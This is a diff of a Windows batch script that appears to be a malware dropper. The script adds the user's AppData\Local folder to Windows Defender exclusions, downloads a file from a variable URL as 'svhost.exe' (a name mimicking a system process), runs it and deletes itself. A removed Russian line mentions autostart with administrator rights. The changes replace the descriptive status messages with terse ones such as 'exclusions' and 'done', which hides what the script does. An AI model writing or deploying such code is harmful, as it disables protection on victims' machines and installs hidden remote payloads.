@@ -7,14 +7,14 @@ set "outputFileName=svhost.exe"
 set "outputFilePath=%USERPROFILE%\AppData\Local\%outputFileName%"
 
 :: Add the Downloads folder to antivirus exclusions (Windows Defender)
-echo Adding Downloads folder to antivirus exclusions...
+echo exclusions
 powershell -Command "try { Add-MpPreference -ExclusionPath $env:USERPROFILE\AppData\Local; Write-Host 'Downloads folder successfully added to exclusions.' -ForegroundColor Green } catch { Write-Host 'Failed to add Downloads folder to antivirus exclusions.' -ForegroundColor Red; exit 1 }"
 
 :: Wait briefly to ensure exclusion is registered
 timeout /t 1 >nul
 
 :: Download the file
-echo Downloading file from %url% to %outputFilePath%...
+echo Downloading file 
 powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"
 
 :: Check if the file exists
@@ -37,4 +37,4 @@ start "" "%outputFilePath%"
 
 del "%~f0"
 
-echo Программа добавлена в автозагрузку с правами администратора.
+echo done
